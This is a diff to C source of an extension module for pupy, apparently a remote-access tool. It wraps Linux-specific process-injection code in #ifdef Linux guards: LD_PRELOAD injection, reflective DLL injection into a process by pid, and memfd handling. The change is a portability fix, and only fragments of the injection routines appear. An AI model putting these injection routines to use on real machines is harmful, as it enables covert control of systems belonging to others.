@@ -6,6 +6,7 @@
 #include <stdlib.h>
 #include <stdint.h>
 #include <stdio.h>
+#include <string.h>
 #include <sys/wait.h>
 #include "debug.h"
 #include "Python-dynload.h"
@@ -13,14 +14,17 @@
 #include <arpa/inet.h>
 #include "tmplibrary.h"
 #include <sys/mman.h>
+#ifdef Linux
 #include <sys/prctl.h>
 #include "memfd.h"
+
+int linux_inject_main(int argc, char **argv);
+#endif
 
 #include "resources_library_compressed_string_txt.c"
 
 #include "revision.h"
 
-int linux_inject_main(int argc, char **argv);
 
 static const char module_doc[] = "Builtins utilities for pupy";
 
@@ -97,6 +101,7 @@ static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
         return NULL;
     }
 
+#ifdef Linux
     if (is_memfd_path(ldobject)) {
         char buf2[PATH_MAX];
         strncpy(buf2, ldobject, sizeof(buf2));
@@ -104,6 +109,7 @@ static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
         cleanup_workaround = 1;
         cleanup = 0;
     }
+#endif
 
     char cmdline[PATH_MAX*2] = {};
     snprintf(
@@ -116,7 +122,9 @@ static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
 
     dprint("Program to execute in child context: %s\n", cmdline);
 
+#ifdef Linux
     prctl(4, 1, 0, 0, 0);
+#endif
 
     pid_t pid = daemonize(0, NULL, NULL, false);
     if (pid == 0) {
@@ -133,7 +141,9 @@ static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
         close(fd);
     }
 
+#ifdef Linux
     prctl(3, 0, 0, 0, 0);
+#endif
 
     if (pid == -1) {
         dprint("Couldn\'t daemonize: %m\n");
@@ -144,6 +154,7 @@ static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
     return PyInt_FromLong(pid);
 }
 
+#ifdef Linux
 static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
 {
     uint32_t dwPid;
@@ -211,6 +222,7 @@ static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
         return PyBool_FromLong(0);
     }
 }
+#endif
 
 static PyObject *Py_load_dll(PyObject *self, PyObject *args)
 {
@@ -288,7 +300,9 @@ static PyMethodDef methods[] = {
     { "get_pupy_config", Py_get_pupy_config, METH_NOARGS, "get_pupy_config() -> string" },
     { "get_arch", Py_get_arch, METH_NOARGS, "get current pupy architecture (x86 or x64)" },
     { "get_modules", Py_get_modules, METH_NOARGS, "get pupy library" },
+#ifdef Linux
     { "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS, "reflective_inject_dll(pid, dll_buffer)\nreflectively inject a dll into a process. raise an Exception on failure" },
+#endif
     { "load_dll", Py_load_dll, METH_VARARGS, "load_dll(dllname, raw_dll) -> ptr" },
     { "mexec", Py_mexec, METH_VARARGS, "mexec(data, argv, redirected_stdio, detach) -> (pid, (in, out, err))" },
     { "ld_preload_inject_dll", Py_ld_preload_inject_dll, METH_VARARGS, "ld_preload_inject_dll(cmdline, dll_buffer, hook_exit) -> pid" },
